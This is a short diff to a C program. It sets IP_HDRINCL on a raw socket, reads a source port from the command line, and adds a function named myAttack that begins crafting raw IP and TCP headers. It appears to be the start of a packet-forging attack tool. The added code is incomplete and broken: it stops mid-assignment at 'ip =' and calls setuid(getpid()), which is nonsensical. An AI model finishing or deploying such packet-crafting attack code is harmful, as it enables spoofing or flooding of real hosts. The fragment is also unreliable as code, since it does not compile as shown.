@@ -68,9 +68,26 @@ int main(int argc, char *argv[])
 	}
 
 	if (0 > (setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, &on, 
-						sizeof(on))))
+						sizeof(on)))){
+		perror("IP_HDRINCL failed\n");
 
+		exit(-3);
+	}
+
+	setuid(getpid());
+	srcport = atoi(argv[3]);
+	myAttack(skfd, &target, srcport);
 
 	return EXIT_SUCCESS;
 }
 
+void myAttack(int skfd, struct sockaddr_in *target, unsigned short srcport){
+	char buf[128] = {0};
+	struct ip *ip;
+	struct tcphdr *tcp;
+	int ip_len;
+
+	ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
+
+	ip = 
+}
